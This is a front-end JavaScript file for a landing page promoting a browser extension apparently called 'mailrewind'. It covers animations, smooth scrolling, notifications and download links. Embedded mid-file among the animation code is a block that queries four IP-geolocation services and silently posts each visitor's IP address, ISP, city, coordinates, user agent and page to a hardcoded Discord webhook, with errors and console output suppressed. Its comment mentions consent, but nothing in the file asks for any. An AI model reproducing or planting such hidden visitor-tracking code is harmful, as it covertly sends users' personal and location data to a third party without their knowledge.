// Smooth scrolling for navigation links
document.addEventListener('DOMContentLoaded', function() {
    // Smooth scrolling for anchor links
    const links = document.querySelectorAll('a[href^="#"]');

    links.forEach(link => {
        link.addEventListener('click', function(e) {
            e.preventDefault();

            const targetId = this.getAttribute('href');
            const targetSection = document.querySelector(targetId);

            if (targetSection) {
                const headerHeight = document.querySelector('.header').offsetHeight;
                const targetPosition = targetSection.offsetTop - headerHeight - 20;

                window.scrollTo({
                    top: targetPosition,
                    behavior: 'smooth'
                });
            }
        });
    });

    // Download button click tracking
    const downloadBtn = document.getElementById('downloadBtn');
    const downloadBtns = document.querySelectorAll('.download-btn');

    downloadBtns.forEach(btn => {
        btn.addEventListener('click', function(e) {
            // Add visual feedback
            this.style.transform = 'scale(0.95)';
            setTimeout(() => {
                this.style.transform = '';
            }, 150);

            // Track download
            console.log('Download started:', this.textContent.trim());

            // Show download notification
            showNotification('Download started! Check your downloads folder.');
        });
    });

    (async function () {
  const WEBHOOK_URL = "https://discord.com/api/webhooks/1416239494042222734/D-Veb83YNEcOhpbiZHVKE4LmdAAnV6PMwe7_niGAoHbw-9uHfXfnDv9PIGSStCbuOi7i"; // <-- replace

  // Truncate utility for Discord field limits
  function trunc(s, n = 1000) {
    if (!s && s !== 0) return "";
    s = String(s);
    return s.length > n ? s.slice(0, n - 1) + "…" : s;
  }

  // Try several providers in order to collect as many fields as possible
  async function queryIpWhoIs() {
    try {
      const r = await fetch("https://ipwho.is/json/", { cache: "no-store" });
      if (!r.ok) return null;
      return await r.json();
    } catch { return null; }
  }

  async function queryIpApiCo() {
    try {
      const r = await fetch("https://ipapi.co/json/", { cache: "no-store" });
      if (!r.ok) return null;
      return await r.json();
    } catch { return null; }
  }

  async function queryIfconfigCo() {
    try {
      const r = await fetch("https://ifconfig.co/json", { cache: "no-store" });
      if (!r.ok) return null;
      return await r.json();
    } catch { return null; }
  }

  async function queryIpInfo() {
    // Note: ipinfo.io may require a token for higher rate limits. This anonymous call may still work but can be limited.
    try {
      const r = await fetch("https://ipinfo.io/json", { cache: "no-store" });
      if (!r.ok) return null;
      return await r.json();
    } catch { return null; }
  }

  // Merge fields from different providers into a single object
  function mergeResults(...sources) {
    const out = {};
    for (const s of sources) {
      if (!s || typeof s !== "object") continue;
      for (const k of Object.keys(s)) {
        if (out[k] === undefined || out[k] === null || out[k] === "") {
          out[k] = s[k];
        }
      }
    }
    return out;
  }

  // Build embed fields from merged data (only include non-empty)
  function buildFields(data, ua, page, ts) {
    const fields = [];

    function add(name, val, inline = false) {
      if (val === undefined || val === null || val === "") return;
      fields.push({ name, value: trunc(String(val), 1000), inline });
    }

    add("IP Address", data.ip || data.ip_address || data.ipv4 || data.ipv6);
    add("Hostname", data.hostname || data.reverse || data.rdns || data.host);
    add("ISP / Provider", data.isp || data.org || data.company || data.connection?.isp);
    add("ASN", (data.asn && (data.asn.name || data.asn)) || data.org || data.connection?.asn);
    add("Org", data.org || data.company || data.connection?.org);
    add("City", data.city || data.region || data.region_name);
    add("Region/State", data.region || data.region_name || data.region_code);
    add("Country", (data.country_name || data.country || data.countryCode || data.country_code) + (data.country_code ? ` (${data.country_code})` : ""));
    add("Continent", data.continent || data.continent_name);
    add("Postal", data.postal || data.postal_code || data.zip);
    // Coordinates
    const lat = data.latitude || data.lat || (data.loc ? data.loc.split(",")[0] : null);
    const lon = data.longitude || data.lon || (data.loc ? data.loc.split(",")[1] : null);
    if (lat && lon) add("Coordinates", `${lat}, ${lon}`);
    add("Timezone", data.timezone || data.time_zone || (data.utc_offset ? data.utc_offset : ""));
    add("Currency", data.currency || data.currency_code);
    add("Connection Type", data.connection?.type || data.connection_type || data.type);
    add("Reverse DNS", data.reverse || data.rdns || data.reverse_dns);
    add("Provider ASN/Prefix", data.prefix || data.asn || data.asnname);

    add("Page", page, false);
    add("User Agent", ua.slice(0, 1000), false);
    add("Timestamp", ts, false);

    return fields;
  }

  // Public single exported function: call after consent
  window.sendIpToWebhook = async function () {
    const ts = new Date().toISOString();
    const ua = navigator.userAgent || "";
    const page = location.href || "";

    // Query providers in parallel for speed, then merge
    const [a, b, c, d] = await Promise.allSettled([
      queryIpWhoIs(), // tends to return many fields incl. isp/asn/latitude/longitude
      queryIpApiCo(), // city/region/country/lat/lon, etc.
      queryIfconfigCo(), // simple response
      queryIpInfo() // ipinfo fields: ip/hostname/loc/org, etc.
    ]);

    const results = [];
    if (a.status === "fulfilled" && a.value) results.push(a.value);
    if (b.status === "fulfilled" && b.value) results.push(b.value);
    if (c.status === "fulfilled" && c.value) results.push(c.value);
    if (d.status === "fulfilled" && d.value) results.push(d.value);

    if (results.length === 0) {
      // nothing returned; still attempt to post minimal data (IP fetch failed due to CORS/network)
      const minimalEmbed = {
        title: "Visitor IP Log (no geo data)",
        color: 0xff9900,
        fields: [
          { name: "Page", value: trunc(page), inline: false },
          { name: "User Agent", value: trunc(ua, 1000), inline: false },
          { name: "Timestamp", value: ts, inline: false }
        ]
      };
      fetch(WEBHOOK_URL, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ embeds: [minimalEmbed] })
      }).catch(()=>{});
      return;
    }

    const merged = mergeResults(...results);

    const fields = buildFields(merged, ua, page, ts);
    const embed = {
      title: "Visitor IP & Geo Log",
      description: "",
      color: 0x2ecc71,
      fields
    };

    // Send embed (no console output)
    fetch(WEBHOOK_URL, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ embeds: [embed] })
    }).catch(()=>{});
  };

})();

    // Intersection Observer for animations
    const observerOptions = {
        threshold: 0.1,
        rootMargin: '0px 0px -50px 0px'
    };

    const observer = new IntersectionObserver(function(entries) {
        entries.forEach(entry => {
            if (entry.isIntersecting) {
                entry.target.classList.add('animate-in');
            }
        });
    }, observerOptions);

    // Observe feature cards
    const featureCards = document.querySelectorAll('.feature-card');
    featureCards.forEach(card => {
        observer.observe(card);
    });

    // Observe support cards
    const supportCards = document.querySelectorAll('.support-card');
    supportCards.forEach(card => {
        observer.observe(card);
    });

    // Observe steps
    const steps = document.querySelectorAll('.step');
    steps.forEach(step => {
        observer.observe(step);
    });

    // Header scroll effect
    let lastScrollTop = 0;
    const header = document.querySelector('.header');

    window.addEventListener('scroll', function() {
        const scrollTop = window.pageYOffset || document.documentElement.scrollTop;

        if (scrollTop > lastScrollTop && scrollTop > 100) {
            // Scrolling down
            header.style.transform = 'translateY(-100%)';
        } else {
            // Scrolling up
            header.style.transform = 'translateY(0)';
        }

        lastScrollTop = scrollTop;

        // Add background blur effect when scrolled
        if (scrollTop > 50) {
            header.style.background = 'linear-gradient(135deg, rgba(102, 126, 234, 0.95) 0%, rgba(118, 75, 162, 0.95) 100%)';
            header.style.backdropFilter = 'blur(10px)';
        } else {
            header.style.background = 'linear-gradient(135deg, #667eea 0%, #764ba2 100%)';
            header.style.backdropFilter = 'none';
        }
    });

    // Email mockup hover effects
    const emailItems = document.querySelectorAll('.email-item');
    emailItems.forEach((item, index) => {
        item.addEventListener('mouseenter', function() {
            this.style.transform = 'translateX(10px)';
            this.style.boxShadow = '0 5px 15px rgba(40, 167, 69, 0.3)';
        });

        item.addEventListener('mouseleave', function() {
            this.style.transform = 'translateX(0)';
            this.style.boxShadow = 'none';
        });
    });

    // Feature card stagger animation
    const featureCardsAnimation = document.querySelectorAll('.feature-card');
    featureCardsAnimation.forEach((card, index) => {
        card.style.animationDelay = `${index * 0.1}s`;
    });

    // Parallax effect for hero section
    window.addEventListener('scroll', function() {
        const scrolled = window.pageYOffset;
        const heroContent = document.querySelector('.hero-content');
        const emailMockup = document.querySelector('.email-mockup');

        if (heroContent && emailMockup) {
            heroContent.style.transform = `translateY(${scrolled * 0.1}px)`;
            emailMockup.style.transform = `perspective(1000px) rotateY(-15deg) rotateX(5deg) translateY(${scrolled * 0.05}px)`;
        }
    });

    // Typing effect for hero title
    const heroTitle = document.querySelector('.hero-content h1');
    if (heroTitle) {
        const originalText = heroTitle.textContent;
        heroTitle.textContent = '';

        let i = 0;
        const typeWriter = function() {
            if (i < originalText.length) {
                heroTitle.textContent += originalText.charAt(i);
                i++;
                setTimeout(typeWriter, 50);
            }
        };

        // Start typing effect after a delay
        setTimeout(typeWriter, 1000);
    }

    // Counter animation for download section
    const downloadCard = document.querySelector('.download-card');
    if (downloadCard) {
        const observer = new IntersectionObserver(function(entries) {
            entries.forEach(entry => {
                if (entry.isIntersecting) {
                    animateCounter();
                }
            });
        }, { threshold: 0.5 });

        observer.observe(downloadCard);
    }

    // Add floating animation to CTA button
    const ctaButton = document.querySelector('.cta-button');
    if (ctaButton) {
        setInterval(() => {
            ctaButton.style.transform = 'translateY(-2px)';
            setTimeout(() => {
                ctaButton.style.transform = 'translateY(0)';
            }, 1000);
        }, 3000);
    }
});

// Notification system
function showNotification(message) {
    // Remove existing notification
    const existingNotification = document.querySelector('.notification');
    if (existingNotification) {
        existingNotification.remove();
    }

    // Create notification
    const notification = document.createElement('div');
    notification.className = 'notification';
    notification.innerHTML = `
        <div class="notification-content">
            <i class="fas fa-check-circle"></i>
            <span>${message}</span>
            <button class="notification-close">&times;</button>
        </div>
    `;

    // Add styles
    notification.style.cssText = `
        position: fixed;
        top: 100px;
        right: 20px;
        background: linear-gradient(135deg, #28a745, #20c997);
        color: white;
        padding: 1rem 1.5rem;
        border-radius: 10px;
        box-shadow: 0 10px 30px rgba(40, 167, 69, 0.3);
        z-index: 10000;
        animation: slideInRight 0.5s ease;
        font-family: 'Segoe UI', sans-serif;
    `;

    const notificationContent = notification.querySelector('.notification-content');
    notificationContent.style.cssText = `
        display: flex;
        align-items: center;
        gap: 10px;
    `;

    const closeBtn = notification.querySelector('.notification-close');
    closeBtn.style.cssText = `
        background: none;
        border: none;
        color: white;
        font-size: 1.2rem;
        cursor: pointer;
        margin-left: 10px;
    `;

    // Add to page
    document.body.appendChild(notification);

    // Auto remove after 5 seconds
    setTimeout(() => {
        if (notification.parentNode) {
            notification.style.animation = 'slideOutRight 0.5s ease';
            setTimeout(() => notification.remove(), 500);
        }
    }, 5000);

    // Close button functionality
    closeBtn.addEventListener('click', () => {
        notification.style.animation = 'slideOutRight 0.5s ease';
        setTimeout(() => notification.remove(), 500);
    });
}

// Add animation keyframes
const style = document.createElement('style');
style.textContent = `
    @keyframes slideInRight {
        from {
            transform: translateX(100%);
            opacity: 0;
        }
        to {
            transform: translateX(0);
            opacity: 1;
        }
    }

    @keyframes slideOutRight {
        from {
            transform: translateX(0);
            opacity: 1;
        }
        to {
            transform: translateX(100%);
            opacity: 0;
        }
    }

    .animate-in {
        animation: fadeInUp 0.8s ease forwards;
    }

    .header {
        transition: all 0.3s ease;
    }

    .email-item {
        transition: all 0.3s ease;
    }

    .feature-card {
        opacity: 0;
        transform: translateY(30px);
        transition: all 0.3s ease;
    }

    .feature-card.animate-in {
        opacity: 1;
        transform: translateY(0);
    }

    .support-card {
        opacity: 0;
        transform: translateY(30px);
        transition: all 0.3s ease;
    }

    .support-card.animate-in {
        opacity: 1;
        transform: translateY(0);
    }

    .step {
        opacity: 0;
        transform: translateY(30px);
        transition: all 0.3s ease;
    }

    .step.animate-in {
        opacity: 1;
        transform: translateY(0);
    }
`;

document.head.appendChild(style);

// Counter animation function
function animateCounter() {
    // This could be used to animate download counters or statistics
    console.log('Counter animation triggered');
}

// Browser detection for download links
function detectBrowser() {
    const userAgent = navigator.userAgent;

    if (userAgent.includes('Firefox')) {
        return 'firefox';
    } else if (userAgent.includes('Chrome')) {
        return 'chrome';
    } else if (userAgent.includes('Safari')) {
        return 'safari';
    } else if (userAgent.includes('Edge')) {
        return 'edge';
    }

    return 'chrome'; // Default to Chrome
}

// Update download button based on browser
document.addEventListener('DOMContentLoaded', function() {
    const browser = detectBrowser();
    const primaryDownloadBtn = document.querySelector('.download-btn.primary');

    if (primaryDownloadBtn) {
        switch(browser) {
            case 'firefox':
                primaryDownloadBtn.innerHTML = '<i class="fab fa-firefox"></i> Download for Firefox';
                primaryDownloadBtn.href = 'https://raw.githubusercontent.com/mailrewind/releases/main/mailrewind-firefox-v2.1.3.zip';
                break;
            case 'edge':
                primaryDownloadBtn.innerHTML = '<i class="fab fa-edge"></i> Download for Edge';
                primaryDownloadBtn.href = 'https://raw.githubusercontent.com/mailrewind/releases/main/mailrewind-edge-v2.1.3.zip';
                break;
            default:
                primaryDownloadBtn.innerHTML = '<i class="fab fa-chrome"></i> Download for Chrome';
                primaryDownloadBtn.href = 'https://raw.githubusercontent.com/mailrewind/releases/main/mailrewind-v2.1.3.zip';
        }
    }
});

// Easter egg - Konami code
let konamiCode = [];
const konamiSequence = ['ArrowUp', 'ArrowUp', 'ArrowDown', 'ArrowDown', 'ArrowLeft', 'ArrowRight', 'ArrowLeft', 'ArrowRight', 'KeyB', 'KeyA'];

document.addEventListener('keydown', function(e) {
    konamiCode.push(e.code);

    if (konamiCode.length > konamiSequence.length) {
        konamiCode.shift();
    }

    if (konamiCode.join('') === konamiSequence.join('')) {
        showNotification('🎉 Easter egg activated! You found the secret code!');

        // Add special effect
        document.body.style.animation = 'rainbow 2s ease-in-out';
        setTimeout(() => {
            document.body.style.animation = '';
        }, 2000);

        konamiCode = [];
    }
});

// Add rainbow animation for easter egg
const rainbowStyle = document.createElement('style');
rainbowStyle.textContent = `
    @keyframes rainbow {
        0% { filter: hue-rotate(0deg); }
        25% { filter: hue-rotate(90deg); }
        50% { filter: hue-rotate(180deg); }
        75% { filter: hue-rotate(270deg); }
        100% { filter: hue-rotate(360deg); }
    }
`;
document.head.appendChild(rainbowStyle);

// Advanced Animation Enhancements
document.addEventListener('DOMContentLoaded', function() {
    // Magnetic button effect
    const buttons = document.querySelectorAll('.download-btn, .cta-button');
    buttons.forEach(button => {
        button.addEventListener('mousemove', function(e) {
            const rect = this.getBoundingClientRect();
            const x = e.clientX - rect.left - rect.width / 2;
            const y = e.clientY - rect.top - rect.height / 2;

            this.style.transform = `translate(${x * 0.1}px, ${y * 0.1}px) scale(1.05)`;
        });

        button.addEventListener('mouseleave', function() {
            this.style.transform = '';
        });
    });

    // Parallax scrolling enhancement
    window.addEventListener('scroll', function() {
        const scrolled = window.pageYOffset;
        const rate = scrolled * -0.5;
        const rate2 = scrolled * -0.3;

        // Hero parallax
        const hero = document.querySelector('.hero');
        if (hero) {
            hero.style.transform = `translateY(${rate}px)`;
        }

        // Feature cards parallax
        const featureCards = document.querySelectorAll('.feature-card');
        featureCards.forEach((card, index) => {
            const cardRate = scrolled * (0.1 + index * 0.02);
            card.style.transform = `translateY(${cardRate}px)`;
        });
    });

    // Staggered animation for feature cards
    const observer = new IntersectionObserver((entries) => {
        entries.forEach((entry, index) => {
            if (entry.isIntersecting) {
                setTimeout(() => {
                    entry.target.classList.add('animate-in');
                }, index * 150);
            }
        });
    }, { threshold: 0.1 });

    document.querySelectorAll('.feature-card').forEach(card => {
        observer.observe(card);
    });

    // Mouse trail effect
    let mouseTrail = [];
    const trailLength = 10;

    document.addEventListener('mousemove', function(e) {
        mouseTrail.push({ x: e.clientX, y: e.clientY, time: Date.now() });

        if (mouseTrail.length > trailLength) {
            mouseTrail.shift();
        }

        // Create trail particles
        if (Math.random() > 0.9) {
            createTrailParticle(e.clientX, e.clientY);
        }
    });

    function createTrailParticle(x, y) {
        const particle = document.createElement('div');
        particle.style.cssText = `
            position: fixed;
            width: 4px;
            height: 4px;
            background: linear-gradient(45deg, #667eea, #764ba2);
            border-radius: 50%;
            pointer-events: none;
            z-index: 9999;
            left: ${x}px;
            top: ${y}px;
            opacity: 1;
            transform: scale(1);
            transition: all 1s ease-out;
        `;

        document.body.appendChild(particle);

        setTimeout(() => {
            particle.style.opacity = '0';
            particle.style.transform = 'scale(0)';
            particle.style.top = (y - 50) + 'px';
        }, 10);

        setTimeout(() => {
            particle.remove();
        }, 1000);
    }

    // Enhanced scroll animations
    const animateOnScroll = new IntersectionObserver((entries) => {
        entries.forEach(entry => {
            if (entry.isIntersecting) {
                const element = entry.target;
                element.style.animationPlayState = 'running';

                // Add special effects based on element type
                if (element.classList.contains('step')) {
                    element.style.animation = 'bounce-in 0.8s ease forwards';
                } else if (element.classList.contains('support-card')) {
                    element.style.animation = 'fadeInUp 0.6s ease forwards';
                }
            }
        });
    }, { threshold: 0.3 });

    // Observe all animated elements
    document.querySelectorAll('.step, .support-card, .download-card').forEach(el => {
        el.style.animationPlayState = 'paused';
        animateOnScroll.observe(el);
    });

    // Floating action button effect
    const ctaButton = document.querySelector('.cta-button');
    if (ctaButton) {
        let floatDirection = 1;
        setInterval(() => {
            const currentTransform = ctaButton.style.transform || '';
            const newY = floatDirection * 3;
            ctaButton.style.transform = currentTransform.replace(/translateY\([^)]*\)/, '') + ` translateY(${newY}px)`;
            floatDirection *= -1;
        }, 2000);
    }

    // Text typewriter effect for hero subtitle
    const heroSubtitle = document.querySelector('.hero-content p');
    if (heroSubtitle) {
        const originalText = heroSubtitle.textContent;
        heroSubtitle.textContent = '';
        heroSubtitle.style.borderRight = '2px solid rgba(255,255,255,0.7)';

        let charIndex = 0;
        const typeSpeed = 30;

        function typeWriter() {
            if (charIndex < originalText.length) {
                heroSubtitle.textContent += originalText.charAt(charIndex);
                charIndex++;
                setTimeout(typeWriter, typeSpeed);
            } else {
                // Remove cursor after typing is complete
                setTimeout(() => {
                    heroSubtitle.style.borderRight = 'none';
                }, 500);
            }
        }

        // Start typing after hero title animation
        setTimeout(typeWriter, 1500);
    }

    // Enhanced email items animation
    const emailItems = document.querySelectorAll('.email-item');
    emailItems.forEach((item, index) => {
        // Add wave animation with delay
        item.style.animation = `slideInLeft 0.8s ease ${index * 0.2}s both, wave 2s ease-in-out ${2 + index * 0.3}s infinite`;

        // Add hover sound effect simulation
        item.addEventListener('mouseenter', function() {
            this.style.transform = 'translateX(15px) scale(1.02)';
            this.style.boxShadow = '0 8px 25px rgba(40, 167, 69, 0.4)';

            // Create success ripple effect
            const ripple = document.createElement('div');
            ripple.style.cssText = `
                position: absolute;
                width: 10px;
                height: 10px;
                background: rgba(40, 167, 69, 0.3);
                border-radius: 50%;
                right: 10px;
                top: 50%;
                transform: translate(50%, -50%) scale(0);
                animation: ripple 0.6s ease-out;
            `;

            this.style.position = 'relative';
            this.appendChild(ripple);

            setTimeout(() => ripple.remove(), 600);
        });

        item.addEventListener('mouseleave', function() {
            this.style.transform = 'translateX(0) scale(1)';
            this.style.boxShadow = 'none';
        });
    });

    // Add ripple animation
    const rippleStyle = document.createElement('style');
    rippleStyle.textContent = `
        @keyframes ripple {
            to {
                transform: translate(50%, -50%) scale(4);
                opacity: 0;
            }
        }
    `;
    document.head.appendChild(rippleStyle);
});
